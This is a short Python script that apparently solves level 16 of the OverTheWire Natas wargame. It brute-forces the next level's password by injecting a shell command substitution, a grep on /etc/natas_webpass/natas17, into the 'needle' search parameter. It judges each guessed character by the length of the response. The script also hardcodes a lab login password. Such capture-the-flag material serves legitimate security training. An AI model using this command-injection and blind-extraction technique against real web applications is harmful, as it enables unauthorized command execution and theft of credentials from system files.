import requests
import sys
from string import digits, ascii_lowercase, ascii_uppercase

charset = ascii_lowercase + ascii_uppercase + digits
s = requests.Session()
s.auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')

password = ""
# We assume that the password is 32 chars 
while len(password) < 32:
    for char in charset:
        # payload = {'needle': '$(grep -E ^%s.* /etc/natas_webpass/natas17)' % (password + char)}
        payload = {'needle': f"$(grep -E ^{password + char}.* /etc/natas_webpass/natas17)"}
        r = s.get('http://natas16.natas.labs.overthewire.org/index.php', params=payload)

        if len(r.text) == 1105:
            sys.stdout.write(char)
            sys.stdout.flush()
            password += char
            break